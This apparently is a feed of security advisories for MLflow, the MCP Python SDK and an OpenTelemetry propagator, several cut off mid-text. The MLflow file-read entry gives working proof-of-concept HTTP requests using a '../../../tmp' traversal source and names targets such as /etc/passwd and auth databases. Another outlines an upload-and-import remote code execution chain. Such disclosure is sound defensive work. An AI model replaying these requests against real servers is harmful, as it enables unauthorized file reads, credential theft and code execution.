items.title: [mlflow] MLflow vulnerable to arbitrary file read on unauthenticated servers via prompt model version source
items.summary: SummaryOn MLflow tracking servers running without authentication, which is the default for mlflow server, a remote attacker can read arbitrary files from the server’s filesystem by creating a model version tagged as a prompt whose source is a schemeless local path.The fix for CVE-2026-2614 in 3.10.0 added a prompt-specific branch to the CreateModelVersion handler that rejects file:// URIs and absolute paths but runs path validation only when the source carries a URL scheme. A schemeless value such as ../../etc, a plain relative name, ., a percent-encoded path, or a Windows drive-letter path is therefore stored unchanged as the model version’s artifact location, and the model-versions/get-artifact endpoint later serves files from it with the privileges of the server process. The tag check also keyed on the presence of the mlflow.prompt.is_prompt tag rather than its value, so a false value still selected the weaker branch.Servers using --app-name basic-auth are also affected: any authenticated user can create a registered model, so a low-privilege account can use this to read the authentication database, including the admin password hash.Affected: MLflow 3.10.0 through 3.16.1. Fixed in 3.17.0 by mlflow/mlflow#25870, which accepts only MLflow’s own placeholder sources for prompt versions and requires the prompt tag to be true.DetailsWhen creating a model version with the mlflow.prompt.is_prompt tag set to true, the request is handled by the prompt branch in _create_model_version().mlflow/server/handlers.py:2674-2690:is_prompt = _is_prompt_request(request_message)if is_prompt:    source = request_message.source    parsed = urllib.parse.urlparse(source)    if parsed.scheme == "file" or (parsed.scheme == "" and source.startswith("/")):        raise MlflowException(...)    if parsed.scheme:        _validate_non_local_source_contains_relative_paths(source)else:    if request_message.model_id:        _validate_source_model(request_message.source, request_message.model_id)    else:        _validate_source_run(request_message.source, request_message.run_id)The prompt branch does not call _validate_source_run(), _validate_source_model(), or _validate_non_local_source_contains_relative_paths() for schemeless relative paths.The artifact-read sink later trusts the stored source:mlflow/server/handlers.py:2765-2782:def get_model_version_artifact_handler():    name = request.args.get("name")    version = request.args.get("version")    path = request.args["path"]    path = validate_path_is_safe(path)    artifact_uri = _get_model_registry_store().get_model_version_download_uri(name, version)    ...    else:        artifact_repo = get_artifact_repository(artifact_uri)        artifact_path = path    return _send_artifact(artifact_repo, artifact_path)_send_artifact() calls artifact_repository.download_artifacts(path) and serves the resulting local file with send_file().PoCPrerequisite: A reachable MLflow tracking server with model registry endpoints enabled.Create a sentinel file on the server:printf 'MLFLOW_PWNED_SENTINEL_REPORT' > /tmp/sentinel-mlflow.txtSend the following requests to the MLflow server to exploit the traversal:First, create a registered model:POST /api/2.0/mlflow/registered-models/create HTTP/1.1Host: 127.0.0.1:5000Content-Type: application/json{"name": "pwned-model"}Next, create a prompt-tagged model version with the malicious relative source ../../../tmp:POST /api/2.0/mlflow/model-versions/create HTTP/1.1Host: 127.0.0.1:5000Content-Type: application/json{  "name": "pwned-model",  "source": "../../../tmp",  "tags": [{"key": "mlflow.prompt.is_prompt", "value": "true"}]}Finally, retrieve the arbitrary file via the artifact download endpoint by supplying the target filename in the path parameter:GET /api/2.0/mlflow/model-versions/get-artifact?name=pwned-model&version=1&path=sentinel-mlflow.txt HTTP/1.1Host: 127.0.0.1:5000This returns the contents of /tmp/sentinel-mlflow.txt. The same primitive can read sensitive files like /etc/passwd or tracking databases (e.g. mlflow.db).ImpactDirect impact is arbitrary local file read as the MLflow server process. Confirmed read targets include:/etc/passwdSQLite tracking databases readable by the process (e.g., mlflow-auth.db or basic_auth.db)Environment variables or configurations stored on disk/home/user/.bash_historyThreat model: An attacker who can reach the MLflow tracking server HTTP port can read arbitrary files readable by the MLflow server process. On unauthenticated MLflow deployments, this is directly exploitable without credentials. On auth-enabled deployments, any authenticated user (even low-privileged or "read-only" accounts, depending on default RBAC configurations allowing model creation) can use the primitive. Leaked credential stores may enable offline password attacks or broader administrative compromise.Referenceshttps://github.com/mlflow/mlflow/security/advisories/GHSA-m65p-9j7q-6w33https://github.com/mlflow/mlflow/pull/25870https://github.com/mlflow/mlfl

items.title: [mlflow] MLflow CrewAI autologging records LLM provider API keys in logged trace spans
items.summary: Summarymlflow.crewai.autolog() leaks CrewAI LLM provider API keys into MLflow trace telemetry.When a CrewAI Agent is instrumented with MLflow autologging, MLflow serializes the agent's __dict__ and converts its fields to strings. The llm field contains the CrewAI LLM object, whose string representation includes its api_key in plaintext.As a result, an application that calls mlflow.crewai.autolog() can unintentionally send its LLM provider API key to the MLflow trace backend or configured OTLP destination.The application does not need to explicitly log the credential or place it in a span attribute. The credential is extracted automatically by MLflow's instrumentation.This was verified on MLflow 3.16.0 with CrewAI 1.15.18 using MLflow's own OTLP exporter. The fake credential appeared in 5 attribute locations across 2 spans.DetailsThe primary issue is in:mlflow/crewai/autolog.py::_get_agent_attributes()The function walks the CrewAI Agent.__dict__ and converts agent fields to strings. tools and embedder receive special handling, but credential-bearing objects such as the following are not sanitized:llmfunction_calling_llmagent_executorcrewFor example, agent.llm is a CrewAI LLM object. In CrewAI 1.15.18, the underlying LLM model contains api_key as a normal field. Its string representation therefore contains the credential:llm_type='openai' model='gpt-4.1-mini' ... api_key='sk-proj-...' ...MLflow subsequently stores this string as a span attribute.There is an important indication that this is an unintended disclosure: MLflow's dedicated LLM attribute extraction already explicitly excludes api_key in _get_llm_attributes(). The LLM span therefore does not expose the credential, while the broader Agent __dict__ serialization bypasses that protection.There is also a second, independent serialization path in:mlflow/crewai/autolog.py::_construct_full_inputs()This code uses:v.__dict__ if hasattr(v, "__dict__") else von call arguments. During CrewAI execution, the Agent object is passed as an argument, causing its __dict__ to be expanded and the credential-bearing LLM object to be included in mlflow.spanInputs.Therefore, there are two independent leakage paths:Agent span attributes through _get_agent_attributes()Span inputs through _construct_full_inputs()Fixing only the Agent attribute serialization would leave the mlflow.spanInputs path vulnerable.A safer approach would be to avoid recursively serializing arbitrary object __dict__ values. Agent telemetry should use an explicit allowlist of non-sensitive scalar fields, and credential-bearing objects such as llm, function_calling_llm, agent_executor, and crew should either be reduced to safe metadata or omitted.Similarly, _construct_full_inputs() should not automatically expand arbitrary objects through __dict__, or the resulting values should pass through the same sanitization mechanism before being attached to a span.PoCEnvironment:MLflow: 3.16.0CrewAI: 1.15.18Python: 3.12.3opentelemetry-exporter-otlp-proto-http: 1.42.11. Direct serialization proofThe following demonstrates the vulnerability without starting a Crew, making a network request, or requiring an MLflow server:import importlibfrom crewai import LLM, Agentautolog = importlib.import_module("mlflow.crewai.autolog")llm = LLM(    model="gpt-4.1-mini",    api_key="sk-proj-EXAMPLE1234567890",)agent = Agent(    role="r",    goal="g",    backstory="b",    llm=llm,)attrs = autolog._get_agent_attributes(agent)assert "sk-proj-EXAMPLE1234567890" in attrs["llm"]print(attrs["llm"])The output contains the API key in plaintext, for example:llm_type='openai' model='gpt-4.1-mini' ... api_key='sk-proj-EXAMPLE1234567890' ...No provider request is required.2. End-to-end trace disclosureThe issue can also be reproduced through MLflow's actual OTLP exporter.Configure a local OTLP HTTP receiver and set:export OTEL_EXPORTER_OTLP_TRACES_ENDPOINT=http://127.0.0.1:4318/v1/tracesexport OTEL_EXPORTER_OTLP_TRACES_PROTOCOL=http/protobufexport CREWAI_DISABLE_TELEMETRY=trueThen run:import mlflowfrom crewai import Agent, Crew, LLM, Taskmlflow.crewai.autolog()llm = LLM(    model="gpt-4.1-mini",    api_key="sk-proj-EXAMPLE1234567890",)agent = Agent(    role="Support Responder",    goal="Answer support questions",    backstory="A support agent",    llm=llm,)task = Task(    description="Answer the user's question",    expected_output="A response",    agent=agent,)crew = Crew(    agents=[agent],    tasks=[task],)crew.kickoff()A local OTLP receiver can decode the ExportTraceServiceRequest sent by MLflow.The provider request is expected to fail because the credential is intentionally fake. This does not affect the vulnerability: the sensitive value is added to the MLflow span when the instrumentation starts, before the provider call succeeds or fails.In the tested environment, the fake API key appeared in the exported telemetry in 5 locations across 2 spans, including:Support Responder  attributes.llm  attributes.function_calling_llm  attributes.ag

items.title: [mlflow] MLflow vulnerable to remote code execution on unauthenticated servers via third-party scorer deserialization importing caller-placed artifact modules
items.summary: SummaryMLflow 3.12.0 introduced registration and deserialization support for third-party scorers in OSS MLflow. During scorer deserialization, the server accepts a request-controlled Python module path beneath one of four allowed package prefixes, imports that module, obtains a request-controlled class, and instantiates it synchronously.An HTTP caller can combine this behavior with MLflow's built-in experiment, run, and artifact-upload endpoints:Create an experiment whose local artifact location points to a writable allowed scorer package.Create a run, causing MLflow to allocate <artifact_location>/<run_id>/artifacts/.Upload a Python module into that run artifact directory.Submit a serialized third-party scorer whose module path resolves to the uploaded file.Trigger server-side import and class construction through /ajax-api/3.0/mlflow/scorer/invoke.On the default no-auth server using the official MLflow v3.14.0 image, this produces unauthenticated arbitrary Python code execution with the privileges of the MLflow server process. The reproduced image runs the process as uid 0 and permits writes to its installed Python package tree.The attached proof of concept is intentionally harmless. The uploaded constructor performs one action only: it writes a random marker beside its own uploaded run artifact. The marker is then downloaded through MLflow's run-artifact endpoint and checked for an exact match.Technical details1. The allow-list accepts attacker-created descendantsAt release commit 86cd7f5a1dc25a1387ad07c87811bbc30f62951c, mlflow/genai/scorers/scorer_utils.py defines these allowed roots:THIRD_PARTY_SCORER_ALLOWED_MODULES = frozenset({    "mlflow.genai.scorers.ragas",    "mlflow.genai.scorers.deepeval",    "mlflow.genai.scorers.trulens",    "mlflow.genai.scorers.phoenix",})In mlflow/genai/scorers/base.py, the deserializer accepts either an exact root or any descendant:module_path == m or module_path.startswith(m + ".")It then performs the following operations using request-controlled values:module = importlib.import_module(module_path)scorer_class = getattr(module, class_name, None)scorer_instance = scorer_class(**init_kwargs)A package-name prefix is not a provenance boundary. If the server process can write below an allowed package, an attacker-created descendant can satisfy the string-prefix check and become importable Python code.Relevant source locations at the v3.14.0 release commit:mlflow/genai/scorers/scorer_utils.py, allowed third-party scorer modulesmlflow/genai/scorers/base.py, third-party scorer deserialization and construction2. Deserialization occurs before trace processingIn mlflow/server/handlers.py, _invoke_scorer_handler() parses the supplied serialized scorer and calls:scorer = Scorer.model_validate_json(serialized_scorer)Only after deserialization and construction does the handler call:batches = get_trace_batches_for_scorer(trace_ids, scorer, tracking_store)The attacker-controlled constructor therefore runs before the server validates or resolves the supplied trace IDs.The minimal proof class is deliberately not a complete MLflow scorer. After its constructor writes the marker, later trace-batching logic accesses scorer attributes that the proof class does not implement. The resulting HTTP 500 occurs after code execution and does not invalidate the proof.No background job execution or special job-execution server option is required to reach the constructor.3. MLflow's artifact layout places the module under the trusted prefixThe experiment creation endpoint accepts an artifact_location. For file-backed experiments, MLflow derives each run artifact directory as:<artifact_location>/<run_id>/artifacts/The proof of concept selects this package directory in the official v3.14.0 image:file:///usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulensAfter creating a run and uploading audit_<token>.py, the resulting filesystem location is:/usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens/<run_id>/artifacts/audit_<token>.pyThe corresponding import path is:mlflow.genai.scorers.trulens.<run_id>.artifacts.audit_<token>The attack does not overwrite an existing package module. It creates a new run-scoped module in the normal file-backed artifact layout. The run ID is returned to the caller.4. Authentication and authorization behaviorWith authentication disabled, as in the default reproduced server configuration, no credentials are required.When MLflow basic authentication is enabled, authentication still applies. However, the scorer-invocation AJAX endpoint is assigned to validate_gateway_proxy, which returns True without performing an experiment- or scorer-level resource permission check.Practical exploitation in an authenticated deployment still requires the caller to create an experiment and run and upload artifacts to them. The key authorization issue is that scorer deserialization itself is not gated by a resource-specific permission check for the supplied experiment

items.title: [mcp] Model Context Protocol Python SDK: Server bearer-token authentication accepts tokens issued for a different resource server
items.summary: SummaryIn affected versions, the SDK's server-side bearer authentication had no way to check that a token was issued for your server (its audience). Where one authorization server issues tokens for several services, a valid token for another service was also accepted by your MCP server.Am I affected?Yes, if your HTTP server uses the SDK's bearer authentication (auth=AuthSettings(...) with token_verifier=), its authorization server also issues tokens for other services, and your TokenVerifier does not check the token's audience (aud) itself.Affected versions:mcp 1.10.0 through 1.29.1mcp 2.0.0 through 2.1.1FixUpgrade to:1.x: mcp 1.30.0 or later2.x: mcp 2.2.0 or laterUpgrading alone changes nothing. The patched versions add a validate_token_resource setting that is off unless you set it. To turn the check on, make both of these changes together:Set validate_token_resource=True in AuthSettings, with resource_server_url set to the audience your authorization server puts in tokens for your server.Return the token's audience from verify_token() as AccessToken.resource.A token for another service then gets 401. With only the first change, every request gets 401.If your TokenVerifier already checks the audience, set validate_token_resource=False to silence the deprecation warning. The setting will default to True in 3.0.If you cannot upgrade yet, reject any token whose aud does not include your server inside verify_token(). That closes the issue on every version.Referenceshttps://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-w4fh-qvv9-3v23https://github.com/modelcontextprotocol/python-sdk/pull/3447https://github.com/modelcontextprotocol/python-sdk/pull/3451https://github.com/modelcontextprotocol/python-sdk/commit/0c9136841ff092987a20700ff9c2c9789bda2f40https://github.com/modelcontextprotocol/python-sdk/commit/8c2fa6eabacde869d75568e33b9d466b58c2f512https://github.com/modelcontextprotocol/python-sdk/releases/tag/v1.30.0https://github.com/modelcontextprotocol/python-sdk/releases/tag/v2.2.0https://github.com/advisories/GHSA-w4fh-qvv9-3v23

items.title: [opentelemetry-propagator-jaeger] OpenTelemetry Python: Unbounded memory allocation in Jaeger baggage propagation
items.summary: SummaryJaegerPropagator.extract() in opentelemetry-propagator-jaeger did not enforce limits when extracting inbound uberctx-* baggage headers. Attacker-controlled baggage could cause unnecessary CPU work and short-lived heap allocations while processing more data than the propagator should accept.ImpactServices that enable the optional Jaeger propagator and accept untrusted inbound propagation headers may experience increased per-request resource usage. This can contribute to denial-of-service risk when transport-level limits are absent or configured above the baggage limits.The practical impact for most Python web deployments is limited. The package must be installed separately, and the Jaeger propagator is not enabled by the default OpenTelemetry Python configuration.Common Python web servers also constrain request headers before they reach the propagator:Gunicorn allows a maximum of 100 request-header fields and 8,190 bytes per field by default.Uvicorn’s h11 implementation limits its incomplete-event buffer to 16,384 bytes by default.The risk is higher for non-HTTP transports, custom TextMapGetter implementations, or deployments where server and gateway limits have been increased or disabled.The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.PatchesVersions of opentelemetry-propagator-jaeger earlier than 1.45.0 are affected.Upgrade opentelemetry-propagator-jaeger to version 1.45.0 or later.Version 1.45.0 limits extraction to 180 entries and 8,192 total bytes and skips entries larger than 4,096 bytes.CredittonghuarootReferenceshttps://github.com/open-telemetry/opentelemetry-python/security/advisories/GHSA-f5m9-jfrj-jjj7https://github.com/open-telemetry/opentelemetry-python/pull/5556https://github.com/open-telemetry/opentelemetry-python/commit/65c4eeb87cd3815dc795d3b5485e9ea0d5affcc7https://github.com/open-telemetry/opentelemetry-python/releases/tag/v1.45.0https://github.com/advisories/GHSA-f5m9-jfrj-jjj7

items.title: [mcp] Model Context Protocol Python SDK: HTTP client transports followed cross-origin redirects carrying custom headers and bodies
items.summary: SummaryIn affected versions, the SDK's Streamable HTTP and SSE client transports followed HTTP redirects to any host. If the configured MCP endpoint answered with a redirect to a different origin:custom headers set on the client (for example an X-API-Key credential) were sent to that origin, andon a 307 or 308 redirect the request body was re-sent there too.The SDK's OAuth client providers followed redirects on their own discovery, registration and token requests in the same way.A lone Authorization bearer header was not exposed; the HTTP library already drops it on cross-origin redirects.Anyone able to make an endpoint you trust redirect elsewhere (a stale redirect to a lapsed domain, a misrouted proxy rule, redirect logic an attacker can influence) could capture that material. A server that is itself malicious gains nothing this way; it already receives your requests directly.Am I affected?Yes, if your code uses the SDK as an MCP client over HTTP through any of:streamable_http_client (on 2.x also Client given an http:// or https:// URL)streamablehttp_client or sse_clientClientSessionGroup with HTTP server parametersthe internal create_mcp_http_client helperThis includes an HTTP client you passed in yourself with follow_redirects=True.Affected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.Not affected:MCP serversstdio clientsa client you supplied with follow_redirects left at its default of FalseFixUpgrade to mcp 1.30.0 (1.x) or 2.2.0 (2.x) or later; no code changes are needed.The transports, and the OAuth providers' own requests, now follow a redirect only when it stays on the endpoint's origin (same scheme, host and port, or an http to https upgrade on the same host) and keeps the request method. Any other redirect is not followed and the request fails with an error naming the target (MCPError on 2.x, httpx.HTTPStatusError on 1.x), whichever HTTP client the transport uses. The internal create_mcp_http_client helper no longer turns redirect following on, so code calling it directly now receives the redirect response instead.If your client currently reaches its server through a redirect to another host, including a server that needs no credentials, it will stop connecting after the upgrade: set the endpoint URL to the redirect's target.Until you can upgrade, supply your own HTTP client with follow_redirects left at False (http_client= on streamable_http_client; httpx_client_factory= on sse_client and streamablehttp_client; ClientSessionGroup has no such parameter). If a client may already have followed a redirect to a host you do not control, rotate the credentials it carried.If you genuinely need the old behaviour (unsupported)This restores what this advisory fixes: redirects to any host are followed again, carrying your custom headers and, on 307/308, the request body, OAuth token requests included. Prefer setting the endpoint URL to the redirect's target. If you cannot, and you accept forwarding credentials to the redirect target, give the transport an HTTP client that follows redirects regardless of what the SDK asks for:import httpx2  # on 1.x: import httpx and subclass httpx.AsyncClient insteadclass FollowRedirectsAnyway(httpx2.AsyncClient):    """Follows redirects to ANY origin. Deliberately gives up the SDK's same-origin protection."""    async def send(self, request, *, follow_redirects=False, **kwargs):        return await super().send(request, follow_redirects=True, **kwargs)http_client = FollowRedirectsAnyway(timeout=httpx2.Timeout(30, read=300))# streamable_http_client(url, http_client=http_client)# sse_client / streamablehttp_client take a factory instead:def client_factory(headers=None, timeout=None, auth=None):    return FollowRedirectsAnyway(headers=headers, auth=auth,                                 timeout=timeout if timeout is not None else httpx2.Timeout(30, read=300))# sse_client(url, httpx_client_factory=client_factory)The redirect handling is then the HTTP library's own, as before the fix: a lone Authorization header is still dropped on cross-origin hops and 301/302/303 become GET. It is not something the SDK supports or tests.Referenceshttps://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-5h93-6whr-6q8jhttps://github.com/modelcontextprotocol/python-sdk/pull/3397https://github.com/modelcontextprotocol/python-sdk/pull/3448https://github.com/modelcontextprotocol/python-sdk/commit/2106335745563b2321b8c73fef2c12903d00aa6ehttps://github.com/modelcontextprotocol/python-sdk/commit/c6762e821c527925f0b617db216d00fbd1d0bf99https://github.com/modelcontextprotocol/python-sdk/releases/tag/v1.30.0https://github.com/modelcontextprotocol/python-sdk/releases/tag/v2.2.0https://github.com/advisories/GHSA-5h93-6whr-6q8j

items.title: [mcp] Model Context Protocol Python SDK: Client fetched server-chosen $ref URLs while validating tool results against output schemas
items.summary: SummaryIn affected versions, when a connected MCP server declared an outputSchema for a tool, the SDK's client validated each call_tool result with jsonschema's default resolver, which fetches any $ref it cannot resolve locally by opening the URL. A server could therefore put an http://, https:// or file:// reference in a tool's output schema and make the client:request that URL, or read that local file, from the client's own network position on every call of the tool (the content was used only as a schema and never sent back to the server), andstall: the fetch ran synchronously on the event loop with no timeout, so a target that accepted the connection and then went quiet froze every session in the process for as long as it held the connection.Am I affected?Yes, if your application uses the SDK as an MCP client (ClientSession over any transport, ClientSessionGroup, or the 2.x Client) and calls tools on servers you do not fully control. There was no setting that turned the validation off.Affected versions: 1.10.0 through 1.29.1, and 2.0.0 through 2.1.1.Not affected: applications that only build servers. If nothing in your code uses ClientSession, ClientSessionGroup or the 2.x Client class, you are not affected.FixUpgrade to mcp 1.30.0 (1.x) or 2.2.0 (2.x) or later. The client now resolves references only within the schema document the server sent (plus the standard JSON Schema metaschemas), so result validation performs no network or file access. A tool whose output schema points outside its own document fails at call time with RuntimeError (Invalid schema for tool ...); in-document references such as #/$defs/... work as before.Until you can upgrade, call tools only on servers you trust. As a partial stopgap, skip tools whose outputSchema contains an $id, or a $ref / $dynamicRef that does not start with #.Referenceshttps://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-rwrf-2pqf-9j8jhttps://github.com/modelcontextprotocol/python-sdk/pull/3394https://github.com/modelcontextprotocol/python-sdk/pull/3396https://github.com/modelcontextprotocol/python-sdk/commit/5ebdfed4060d8e5b11b8e2348f86bad4d1fb8836https://github.com/modelcontextprotocol/python-sdk/commit/6705402e246dc4eb1fcdf4d9902b78d3c9c36e1bhttps://github.com/modelcontextprotocol/python-sdk/releases/tag/v1.30.0https://github.com/modelcontextprotocol/python-sdk/releases/tag/v2.2.0https://github.com/advisories/GHSA-rwrf-2pqf-9j8j
